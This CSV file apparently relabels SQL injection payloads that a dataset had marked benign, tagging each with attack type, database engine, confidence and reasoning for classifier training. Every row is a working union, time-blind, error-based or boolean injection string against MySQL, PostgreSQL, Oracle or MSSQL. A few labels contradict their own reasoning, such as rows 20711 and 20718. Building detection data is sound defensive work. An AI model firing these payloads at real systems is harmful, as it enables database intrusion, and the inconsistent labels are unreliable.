id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20663,"1 ) as nkjo where 8462 = 8462 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20664,1%' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20665,"1"" ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""yxpo"" like ""yxpo",error_based,mysql,0.9,"Labeled benign but contains 'extractvalue()' → MySQL error_based (P4); false negative",1
20666,1'+ ( select oljg where 2006 = 2006 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +',error_based,oracle,0.95,"Labeled benign but contains 'xmltype()' → Oracle error_based (P4); false negative",1
20667,1' ) as jztg where 1222 = 1222 or sleep ( 5 ) #,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20668,"1 ) ) as gobw where 3496 = 3496 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20669,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""jbty"" like ""jbty",time_blind,oracle,0.95,"Labeled benign but contains 'dbms_pipe.receive_message' → Oracle time_blind (P5); false negative",2
20670,"1%"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( ""%"" = """,time_blind,postgresql,0.95,"Labeled benign but contains 'pg_sleep()' → PostgreSQL time_blind (P5); false negative",2
20671,"1"" waitfor delay '0:0:5'--",time_blind,mssql,0.95,"Labeled benign but contains 'WAITFOR DELAY' → MSSQL time_blind (P5); false negative",2
20672,"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 'kejy' = 'kejy",error_based,mysql,0.9,"Labeled benign but contains 'updatexml()' → MySQL error_based (P4); false negative",1
20673,1%' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20674,1%' ) rlike sleep ( 5 ) #,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' + 'RLIKE' → MySQL time_blind (P5); false negative",1
20675,"-4182 ) ) as wkfh where 6145 = 6145 union all select 6145,6145,6145,6145,6145#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20676,"-9606%"" ) ) ) union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20677,"-3498"" ) ) as xbvb where 2056 = 2056 union all select 2056,2056,2056,2056,2056,2056,2056--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20678,"1' in boolean mode ) or elt ( 6272 = 6272,sleep ( 5 ) ) #",time_blind,mysql,0.75,"Labeled benign but contains 'ELT()+sleep()' → MySQL time_blind (P5); sleep is dominant",1
20679,1%' and sleep ( 5 ) and '%' = ',time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20680,"1"" or sleep ( 5 ) and ""telb"" = ""telb",time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20681,"-1187' ) union all select 8202,8202,8202,8202,8202,8202,8202#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20682,"-6249' ) ) ) union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20683,"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",time_blind,mysql,0.9,"Labeled benign but contains 'benchmark()' → MySQL time_blind (P5); false negative",1
20684,"1 ) ) union all select null,null#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20685,"1"" or sleep ( 5 )",time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20686,1 ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 3919 = 3919,time_blind,postgresql,0.95,"Labeled benign but contains 'pg_sleep()' → PostgreSQL time_blind (P5); false negative",2
20687,"1 ) where 3740 = 3740 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20688,"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",boolean_blind,mysql,0.8,"Labeled benign but contains 'UNION' + 'ELT()' boolean → MySQL complex boolean (P3); false negative",1
20689,"1"" ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""tlpw"" = ""tlpw",error_based,oracle,0.95,"Labeled benign but contains 'xmltype()' → Oracle error_based (P4); false negative",1
20690,"1%' ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.95,"Labeled benign but contains 'dbms_pipe.receive_message' → Oracle time_blind (P5); false negative",2
20691,1' ) where 5279 = 5279 or sleep ( 5 ) #,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20692,select sleep ( 5 ) and ( ( ( 'qjsc' = 'qjsc,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20693,1%' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and '%' = ',time_blind,postgresql,0.95,"Labeled benign but contains 'pg_sleep()' → PostgreSQL time_blind (P5); false negative",2
20694,"-2857%' ) ) ) union all select 7167,7167,7167,7167,7167,7167,7167,7167#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20695,"1'|| ( select 'xbvz' from dual where 1632 = 1632 union all select null,null,null,null,null,null,null,null--",union_based,oracle,0.85,"Labeled benign but contains 'UNION ALL SELECT' + 'dual' → Oracle union_based (P7); false negative",2
20696,"1 ) ) as spdf where 8554 = 8554 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.95,"Labeled benign but contains 'dbms_pipe.receive_message' → Oracle time_blind (P5); false negative",2
20697,"-9160' ) union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20698,"1' ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'ccqs' = 'ccqs",error_based,mysql,0.9,"Labeled benign but contains 'extractvalue()' → MySQL error_based (P4); false negative",1
20699,"1 ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20700,"-1710"" ) ) as cvky where 1858 = 1858 union all select 1858,1858--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20701,1 ) as xwgf where 4204 = 4204 and sleep ( 5 ) --,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20702,"-3343'|| ( select 'ssvt' where 5179 = 5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20703,-3424' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'dyuo' = 'dyuo,error_based,oracle,0.95,"Labeled benign but contains 'xmltype()' → Oracle error_based (P4); false negative",1
20704,"-4176'+ ( select 'muio' where 4256 = 4256 union all select 4256,4256,4256,4256,4256,4256#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20705,"1 ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",time_blind,mysql,0.9,"Labeled benign but contains 'benchmark()' → MySQL time_blind (P5); false negative",1
20706,1' ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20707,1%' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( '%' = ',time_blind,postgresql,0.95,"Labeled benign but contains 'pg_sleep()' → PostgreSQL time_blind (P5); false negative",2
20708,"1"" ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ""cadh"" like ""cadh",time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20709,"1,row ( 7937,5067 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 7937 = 7937,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 9974 union select 5497 union select 8209 union select 8147 ) a group by x )",boolean_blind,mysql,0.8,"Labeled benign but contains 'UNION' + 'ELT()' boolean → MySQL complex boolean (P3); false negative",1
20710,-9841 where 4612 = 4612 union all select 4612--,union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20711,1 ) where 6950 = 6950 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,boolean_blind,mysql,0.75,"Labeled benign but contains 'RLIKE' + 'sleep()'; RLIKE is P3, sleep is P5 → prioritizing sleep → time_blind",1
20712,select sleep ( 5 ) and 'beuk' = 'beuk,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20713,"1%"" ) union all select null,null,null,null,null--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20714,"1%"" ) ) waitfor delay '0:0:5'--",time_blind,mssql,0.95,"Labeled benign but contains 'WAITFOR DELAY' → MSSQL time_blind (P5); false negative",2
20715,"-2821"" ) ) ) union all select 3920,3920,3920,3920,3920,3920,3920#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20716,"-9966' ) ) union all select 7230,7230,7230,7230,7230,7230,7230#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20717,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20718,1'|| ( select 'wszt' from dual where 6854 = 6854 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) ||',time_blind,oracle,0.95,"Labeled benign but contains 'pg_sleep()'; note pg_sleep in Oracle context suggests mixed DB context → time_blind",1
20719,1 and sleep ( 5 ) # qcyj,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20720,"1 ) as asmt where 4986 = 4986 union all select null,null#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20721,select sleep ( 5 ) and ( '%' = ',time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20722,"1"" ) ) ) union all select null,null,null,null--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20723,"1 ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.95,"Labeled benign but contains 'dbms_pipe.receive_message' → Oracle time_blind (P5); false negative",2
20724,"1' where 4185 = 4185 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,mysql,0.9,"Labeled benign but contains 'extractvalue()' + 'benchmark()' → MySQL error_based (P4); false negative",1
20725,"1' in boolean mode ) union all select null,null#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20726,"-4318"" ) as vpvt where 5543 = 5543 union all select 5543,5543,5543,5543,5543,5543--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20727,"1 where 6412 = 6412 union all select null,null,null,null,null,null,null--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20728,1' ) ) as bewk where 3672 = 3672 or sleep ( 5 ) --,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20729,"1,updatexml ( 2917,concat ( 0x2e,0x7171706a71, ( select ( elt ( 2917 = 2917,1 ) ) ) ,0x717a767a71 ) ,8295 )",error_based,mysql,0.9,"Labeled benign but contains 'updatexml()' → MySQL error_based (P4); false negative",1
20730,"1'+ ( select bruk where 1400 = 1400 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) ) +'",error_based,mysql,0.9,"Labeled benign but contains 'extractvalue()' → MySQL error_based (P4); false negative",1
20731,"1%"" union all select null--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20732,"1%"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( ""%"" = """,time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20733,"1' ) ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20734,"1"" ) or sleep ( 5 ) and ( ""xgtk"" = ""xgtk",time_blind,mysql,0.85,"Labeled benign but contains 'sleep()' → MySQL time_blind (P5); false negative",1
20735,"1'|| ( select 'tmsj' where 2971 = 2971 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20736,-1816%' ) ) ) union all select 2072--,union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20737,"1%"" ) union all select null,null,null,null,null,null,null--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20738,"1' ) ) as bwjl where 8538 = 8538 union all select null,null,null,null,null,null,null#",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT null' → union_based (P7); false negative",2
20739,"-9237' ) union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20740,"-8772%"" ) union all select 5433,5433,5433,5433,5433,5433,5433,5433,5433,5433--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
20741,"-7171%' ) ) union all select 5580,5580,5580,5580,5580,5580,5580,5580--",union_based,generic,0.85,"Labeled benign but contains 'UNION ALL SELECT' → union_based (P7); false negative",2
